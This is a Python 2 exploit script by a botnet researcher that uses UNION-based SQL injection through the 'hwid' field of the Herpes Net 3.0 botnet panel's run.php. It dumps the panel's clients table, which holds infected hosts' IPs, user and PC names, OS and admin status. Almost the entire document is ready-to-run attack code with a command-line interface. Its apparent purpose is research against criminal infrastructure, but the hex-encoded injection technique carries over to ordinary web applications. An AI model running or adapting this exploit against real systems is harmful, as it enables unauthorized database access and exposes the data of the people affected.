

Type:  SQL Injection

Author: [bwall](https://twitter.com/botnet_hunter)

https://bwall.github.io/herpes-net-3.0-sqli/

```
import random
import pycurl
import urllib
import cStringIO
import json


def _u(i):
    try:
        return unicode(i, errors='ignore')
    except:
        return i


class HerpesNetPanel:
    def __init__(self, gateway_url):
        self.gateway_url = gateway_url

    @staticmethod
    def _get_field(gateway, table, column, row):
        prefix = ""
        while len(prefix) < 6:
            prefix += random.choice(['1', '2', '3', '4', '5', '6', '7', '8', '9'])

        bot_id = "' AND 1=2 UNION ALL SELECT 0x" + ("' AND 1=2 UNION ALL SELECT 1,2," + column + ",'" +
                                                    prefix + "',5 FROM " + table + " LIMIT 1 OFFSET " +
                                                    str(row) + " -- --").encode("hex") + ",2,3,4,5,6,7,8,9 -- --"

        buf = cStringIO.StringIO()
        c = pycurl.Curl()
        params = urllib.urlencode({'hwid': bot_id})
        c.setopt(pycurl.USERAGENT, "74978b6ecc6c19836a17a3c2cd0840b0")
        c.setopt(c.POSTFIELDS, params)
        c.setopt(c.URL, gateway)
        c.setopt(c.WRITEFUNCTION, buf.write)
        c.setopt(pycurl.CONNECTTIMEOUT, 10)
        c.setopt(pycurl.TIMEOUT, 10)
        c.perform()

        command = buf.getvalue()
        try:
            if command[-(len(prefix) + 1):] == "|" + prefix:
                return command[:-(len(prefix) + 1)]
        except:
            return None
        return None

    def get_all_bot_details(self):
        count = 0
        bots = []
        while True:
            user = _u(self._get_field(self.gateway_url, 'clients', 'hwid', count))
            if user is None:
                break
            bots.append({'hwid': _u(user),
                         'ip': _u(self._get_field(self.gateway_url, 'clients', 'ip', count)),
                         'cc': _u(self._get_field(self.gateway_url, 'clients', 'cc', count)),
                         'time': _u(self._get_field(self.gateway_url, 'clients', 'time', count)),
                         'userandpc': _u(self._get_field(self.gateway_url, 'clients', 'userandpc', count)),
                         'admin': _u(self._get_field(self.gateway_url, 'clients', 'admin', count)),
                         'os': _u(self._get_field(self.gateway_url, 'clients', 'os', count)),
                         'status': _u(self._get_field(self.gateway_url, 'clients', 'status', count)),
                         'id': _u(self._get_field(self.gateway_url, 'clients', 'id', count))})
            count += 1
        return bots


def print_help():
    print("usage: herpesnet.class.py [-h] url-of-run.php")
    print("")
    print("Herpes Net 3.0 Database Extraction")
    print("Gathering information via SQLi from Herpes Net 3.0 botnets")
    print("By Brian Wallace (@botnet_hunter)")
    print("")
    print("  url-of-run.php                URL of run.php in the Herpes Net panel")
    print("  -h --help                     Print this message")
    print("")


if __name__ == "__main__":
    from argparse import ArgumentParser

    parser = ArgumentParser(add_help=False)
    parser.add_argument('run', metavar='run', type=str, nargs='?', default=None)
    parser.add_argument('-h', '--help', default=False, required=False, action='store_true')
    parser.add_argument('-v', '--verbose', default=False, required=False, action='store_true')

    args = parser.parse_args()

    if args.help or args.run is None:
        print_help()
        exit()

    h = HerpesNetPanel(args.run)
    print json.dumps(h.get_all_bot_details(), sort_keys=True, indent=4, separators=(',', ': '))



```
